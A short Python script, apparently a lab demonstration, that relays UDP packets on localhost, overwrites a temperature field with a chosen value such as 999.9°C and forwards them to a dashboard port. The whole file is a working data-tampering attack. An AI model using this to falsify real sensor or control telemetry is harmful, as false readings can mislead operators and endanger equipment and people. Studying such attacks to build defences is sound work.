#!/usr/bin/env python3
"""
Simple Local MITM Attack - Works on same machine
Intercepts UDP packets and modifies temperature values
"""

import socket
import struct
import threading
import time
import sys

class LocalMITM:
    def __init__(self, target_temp=999.9):
        self.target_temp = target_temp
        self.running = False
        self.intercepted_packets = 0
        self.modified_packets = 0
        
    def start_interception(self):
        """Start intercepting UDP packets on port 7401"""
        print("🎯 Starting Local MITM Attack...")
        print(f"🌡️ Target temperature: {self.target_temp}°C")
        print("📡 Intercepting UDP packets on port 7401...")
        
        # Create socket to intercept packets
        self.intercept_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.intercept_socket.bind(('127.0.0.1', 7401))  # Listen on port 7401
        
        # Create socket to forward modified packets
        self.forward_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        self.running = True
        
        while self.running:
            try:
                # Receive packet
                data, addr = self.intercept_socket.recvfrom(1024)
                self.intercepted_packets += 1
                
                print(f"📦 Intercepted packet #{self.intercepted_packets} from {addr}")
                
                # Extract original temperature
                if len(data) >= 4:
                    original_temp = struct.unpack('f', data[:4])[0]
                    print(f"🌡️ Original temperature: {original_temp}°C")
                    
                    # Modify temperature
                    modified_data = struct.pack('f', self.target_temp) + data[4:]
                    self.modified_packets += 1
                    
                    # Forward modified packet to dashboard
                    self.forward_socket.sendto(modified_data, ('127.0.0.1', 7400))
                    print(f"💉 Modified to {self.target_temp}°C and forwarded")
                    print("---")
                
            except Exception as e:
                print(f"⚠️ Error: {e}")
                break
        
        self.intercept_socket.close()
        self.forward_socket.close()
    
    def stop(self):
        """Stop the MITM attack"""
        print("\n🛑 Stopping MITM attack...")
        self.running = False
        print(f"📊 Summary: Intercepted {self.intercepted_packets} packets, Modified {self.modified_packets} packets")

def main():
    target_temp = 999.9
    if len(sys.argv) > 1:
        target_temp = float(sys.argv[1])
    
    mitm = LocalMITM(target_temp)
    
    try:
        mitm.start_interception()
    except KeyboardInterrupt:
        mitm.stop()

if __name__ == "__main__":
    main()
